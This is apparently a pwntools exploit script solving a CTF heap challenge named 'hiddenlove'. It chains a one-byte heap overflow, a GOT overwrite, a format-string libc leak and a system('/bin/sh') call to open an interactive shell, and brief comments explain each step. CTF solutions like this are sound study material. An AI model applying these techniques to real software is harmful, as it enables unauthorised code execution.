from pwn import *
io = process('./hiddenlove')
context.log_level = 'debug'
pause()

def menu(idx):
    io.recvuntil('4.Just throw yourself at her feet')
    io.sendline(str(idx))

def tell(size, words, name):
    menu(1)
    io.recvuntil('how many words do you wanna say with her(0~1000)')
    io.sendline(str(size))
    io.recvuntil('write what you wanna to say with her')
    io.send(words)
    io.recvuntil('ow tell me her name')
    io.send(name)

def takeback():
    menu(3)

def quit(msg):
    menu(4)
    io.recvuntil('(Y/N)')
    io.send(msg)

def edit(msg):
    menu(2)
    io.recvuntil("Don't be shy, make her know your feelings")
    io.send(msg)

chunk_1  = 'nn'
chunk_1 += '\x00'*(0x1000-0x18-len(chunk_1))
chunk_1 += p64(0x50)
quit(chunk_1) # scanf("%2s", &v15); malloced a 0x1000 chunk on the heap so that we can control the size position 

chunk_3 = p64(0)
chunk_3 += p64(0x31) # the size pos cant be none or free will corrupt
tell(0x80, chunk_3, 'A' * 8) # one byte off here to change the LSB og &content to \x00
takeback() # free

elf = ELF('./hiddenlove')
alarm_plt = elf.plt['alarm']
printf_plt = elf.plt['printf']
scanf_plt = elf.plt['__isoc99_scanf']
edited_got = p64(printf_plt) # atoi
edited_got += p64(scanf_plt + 6) # scanf
edited_got += p64(alarm_plt) # exit

chunk_2 = '\x00' * 0x20
chunk_2 += p64(len(edited_got)) # len
chunk_2 += p64(0)        # name
chunk_2 += p64(0x602060) # &content

tell(0x48, chunk_2, 'name') # edit content to got_addr
edit(edited_got) # edit got

free_got = elf.got['free']
menu('%9$p') # use fms to leak libc
io.recvuntil('0x') 
libc_addr = int(io.recvuntil('\n')[:-1], 16)
log.info('libc_addr :' + hex(libc_addr))
puts_libc = libc_addr - 362
l = ELF('./libc-64')
system_libc = puts_libc - l.symbols['puts'] + l.symbols['system']
log.info('system_libc :' + hex(system_libc))

edit(p64(system_libc)) # because we changed exit_got to alarm_plt so we can edit again
menu('/bin/sh')
io.interactive()


# in this challenge u can only malloc 2 times, free 1 time, edit 1 time.
# and only one byte off here
